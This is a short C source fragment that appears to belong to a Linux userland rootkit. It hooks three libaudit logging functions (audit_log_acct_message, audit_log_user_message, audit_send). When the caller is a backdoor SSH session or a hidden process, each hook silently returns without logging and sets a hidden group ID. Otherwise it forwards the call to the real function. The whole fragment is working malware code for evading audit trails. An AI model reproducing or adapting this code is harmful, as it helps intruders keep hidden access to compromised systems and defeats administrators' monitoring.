int audit_log_acct_message(int audit_fd, int type, const char *pgname, const char *op, const char *name, unsigned int id, const char *host, const char *addr, const char *tty, int result){
    if(bd_sshproc() || hidden_ppid()){
        setgid(readgid());
        return 0;
    }

    hook(CAUDIT_LOG_ACCT_MESSAGE);
    return (long)call(CAUDIT_LOG_ACCT_MESSAGE, audit_fd, type, pgname, op, name, id, host, addr, tty, result);
}

int audit_log_user_message(int audit_fd, int type, const char *message, const char *hostname, const char *addr, const char *tty, int result){
    if(bd_sshproc() || hidden_ppid()){
        setgid(readgid());
        return 0;
    }

    hook(CAUDIT_LOG_USER_MESSAGE);
    return (long)call(CAUDIT_LOG_USER_MESSAGE, audit_fd, type, message, hostname, addr, tty, result);
}

int audit_send(int fd, int type, const void *data, unsigned int size){
    if(bd_sshproc() || hidden_ppid()){
        setgid(readgid());
        return 0;
    }

    hook(CAUDIT_SEND);
    return (long)call(CAUDIT_SEND, fd, type, data, size);
}
